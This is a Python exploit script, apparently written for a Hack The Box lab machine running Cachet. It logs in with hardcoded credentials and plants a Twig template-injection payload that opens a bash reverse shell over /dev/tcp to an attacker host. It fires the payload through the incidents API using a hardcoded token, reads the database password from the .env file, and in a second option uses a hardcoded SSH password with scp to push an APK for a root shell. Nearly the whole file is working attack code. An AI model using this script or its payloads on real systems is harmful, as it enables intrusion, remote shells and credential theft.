#!/usr/bin/python3 

from bs4 import BeautifulSoup as bs 
from requests import Session
from pwn import *
import signal, pdb, requests, socket, os, paramiko

def def_handler(sig, frame):
    print("\n\n[!] Saliendo ... \n")
    sys.exit(1)

#Ctrl + C 
signal.signal(signal.SIGINT, def_handler)
    
def loginWeb():
    with Session() as s: 
        site = s.get("%s/auth/login" % main_url)
        bs_content = bs(site.content, "html.parser") 
        token = bs_content.find("input", {"name":"_token"})["value"]
        login_data = {"_token":token, "username":"john", "password":"E%7DV%21mywu_69T4C%7DW", "remember_me":"0"}
        s.post("%s/auth/login" % main_url, login_data)
        home_page = s.get("%s/dashboard" % main_url)
        template_data = {"_token":token, "name":"prueba", "template":'''{{["bash -c 'sh -i >&/dev/tcp/%s/%s 0>&1'"]|filter("system")|join(",")}}''' % (lhost, lport)}
        s.post("%s/dashboard/templates/create" % main_url, template_data)
        created_home = s.get("%s/dashboard/templates/create" % main_url)

def getAccess():
    with Session() as s:
        site = s.get("%s/auth/login" % main_url)
        bs_content = bs(site.content, "html.parser") 
        token = bs_content.find("input", {"name":"_token"})["value"]
        login_data = {"_token":token, "username":"john", "password":"E%7DV%21mywu_69T4C%7DW", "remember_me":"0"}
        s.post("%s/auth/login" % main_url, login_data)
        exploit_data = {"visible":"0", "status":"1", "name":"prueba", "template":"prueba"} 
        s.post("%s/api/v1/incidents" % main_url, headers={'X-Cachet-Token': '7GVCqTY5abrox48Nct8j'}, data=exploit_data)

print("=" * 60)
print('1-<www_data>\n2-<root>\n')
respuesta = int(input())
if respuesta == 1 :
    ip_address = '10.10.11.150'
    main_url = 'http://' + (ip_address) + ':8000'
    lport = '8081' # Cambiar puesto de escucha
    lhost= '10.10.14.32' # Cambiar por ip de HTB 

    loginWeb()
    try: 
        threading.Thread(target=getAccess, args=()).start()
    except Exception as e: 
        log.error(str(e))
    
    shell = listen(lport, timeout=20).wait_for_connection()
    shell.sendline("cd ..")
    shell.sendline('''echo $(cat .env | grep DB_PASSWORD | awk -F"=" '{ { print $2 } }')''')
    shell.interactive()
        
if respuesta == 2:
    lport = '8081' # Cambiar puerto de escucha

    try:
        os.system("sshpass -p s2#4Fg0_%3! scp -o StrictHostKeyChecking=no <<Ruta del apk>> will@10.10.11.150:/opt/mdm/apk_bin/") # Cambiar ubicacion de apk
    except Exception as e: 
        log.error(str(e))
    shell = listen(lport, timeout=60).wait_for_connection()
    shell.interactive()
